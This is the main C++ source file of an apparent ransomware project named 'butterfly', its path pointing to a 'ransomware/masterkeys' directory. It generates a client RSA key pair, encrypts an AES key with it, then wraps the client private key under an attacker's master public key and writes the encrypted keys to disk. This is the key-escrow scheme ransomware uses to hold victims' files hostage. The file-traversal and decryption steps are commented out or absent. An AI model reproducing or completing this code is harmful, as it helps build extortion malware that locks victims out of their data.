
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/rsaEncryptor.h"
#include "crypto/rsaDecryptor.h"


int main(int argc, char* argv[]) {

    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application "<< PROJECT_NAME << " with version " << arg._version);
    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());


    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptor(new butterfly::RSAEncryptor(2048));

    rsaEncryptor->saveClientPrivateRSAKeyFile();

    // 1. encrypt aes key
    std::string aesKey = "0123456789abcdefghijklabcd";
    if ( rsaEncryptor->encrypt(rsaEncryptor->getEvpPkey(), aesKey) ) {
        std::string aesKeyEnc = rsaEncryptor->getEncryptedKey();
        rsaEncryptor->saveEncryptedKeyFile("AESKey.bin", aesKeyEnc, rsaEncryptor->getRSAKeySize());
    }

    std::string cPrivateRSA = rsaEncryptor->getRSAPrivateKeyStr();

    std::unique_ptr<butterfly::RSAEncryptor> rsaEncryptorFile(new butterfly::RSAEncryptor("/home/christian/projects/ransomware/masterkeys/SPublic.pem"));
    EVP_PKEY *pkey1 = rsaEncryptorFile->getEvpPkey();

    if ( rsaEncryptorFile->encrypt(pkey1, cPrivateRSA.substr(0, cPrivateRSA.size()-1)) ) {
        std::string cPrivateRSAEnc = rsaEncryptorFile->getEncryptedKey();
        rsaEncryptorFile->saveEncryptedKeyFile("CPrivateRSA.bin", cPrivateRSAEnc, rsaEncryptorFile->getEvpPkeySize(pkey1));
    }

    /*
    sleep(2);

    std::unique_ptr<butterfly::RSADecryptor> rsaDecryptor(new butterfly::RSADecryptor());

    std::string encKey = rsaDecryptor->getBinKeyFileContents("AESKey.bin");
    EVP_PKEY *pkey = rsaDecryptor->getEvpPkeyFromFile("CPrivateRSA.pem");

    if (rsaDecryptor->decrypt(pkey, encKey) ) {
        LOG_TRACE(rsaDecryptor->getDecryptedKey())
    }*/


    return 0;
}